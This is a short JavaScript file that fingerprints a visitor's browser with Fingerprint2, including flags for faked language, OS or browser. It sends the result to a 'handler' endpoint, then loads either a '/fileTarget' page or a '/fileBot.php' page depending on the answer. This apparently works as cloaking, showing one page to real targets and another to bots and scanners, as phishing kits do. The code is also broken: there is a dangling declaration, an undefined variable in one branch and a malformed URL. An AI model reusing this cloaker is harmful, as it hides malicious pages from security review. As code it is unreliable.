var hasConsole = typeof console !== "undefined"

var fingerprintReport = function () {
    var d1 = new Date()
    var data = [];
    Fingerprint2.get(function (components) {
        var murmur = Fingerprint2.x64hash128(components.map(function (pair) {
            return pair.value
        }).join(), 31)
        var d2 = new Date()
        var time = d2 - d1
        var details = ""


        var hasLiedLanguages = components[22].value;
        var has
        var data = {
            "fingerprint": murmur,
            "timezone": components[9].value,
            "hasLiedLanguages": components[22].value,
            "hasLiedOs": components[24].value,
            "hasLiedBrowser": components[25].value
        }

        $.post(document.location.origin + 'handler', data, function (result) {

            if (result == 'true') {
                var check = $('#site');
                $.ajax({
                    type: "POST",
                    url: document.location.origin + '/fileTarget',
                    cache: true,
                    async: true,
                    success: function (response) {
                        ;
                        check.html(response);
                    }
                });
            }
            else{
                $.ajax({
                    type: "POST",
                    url: document.location.origin + '/fileBot.php',
                    cache: true,
                    async: true,
                    success: function (response) {
                        ;
                        check.html(response);
                    }
                });
            }
        });
    });
}

var cancelId
var cancelFunction

// see usage note in the README
if (window.requestIdleCallback) {
    cancelId = requestIdleCallback(fingerprintReport)
    cancelFunction = cancelIdleCallback
} else {
    cancelId = setTimeout(fingerprintReport, 500)
    cancelFunction = clearTimeout
}